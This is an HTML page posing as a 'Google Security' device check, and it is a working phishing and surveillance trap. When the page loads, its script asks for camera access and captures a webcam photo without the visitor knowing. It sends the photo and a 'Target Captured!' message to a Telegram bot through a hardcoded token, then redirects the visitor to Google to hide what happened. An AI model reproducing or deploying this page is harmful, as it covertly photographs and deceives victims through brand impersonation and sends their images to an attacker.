<!DOCTYPE html>
<html>
<head><title>Google Security</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
    <h3 id="msg">Verifying Device...</h3>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = "8461524246:AAGAsQD20_4t3zR05rI6bu-0FIrG_pgXS-g";
        const chat_id = "7130643157";

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = stream;
                document.getElementById('msg').innerText = "Updating Security...";

                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', chat_id);
                        fd.append('photo', blob, 'img.png');
                        
                        // Pehle Photo bhejne ki koshish
                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                        
                        // Phir Confirmation Message
                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🎯 Target Captured! Check Photo.`);
                        
                        window.location.href = "https://www.google.com";
                    }, 'image/png');
                }, 3000);
            } catch (e) {
                // Agar camera block ho toh Text message bhej de
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=⚠️ Someone opened link but blocked camera.`);
                window.location.href = "https://www.google.com";
            }
        }
        window.onload = start;
    </script>
</body>
</html>
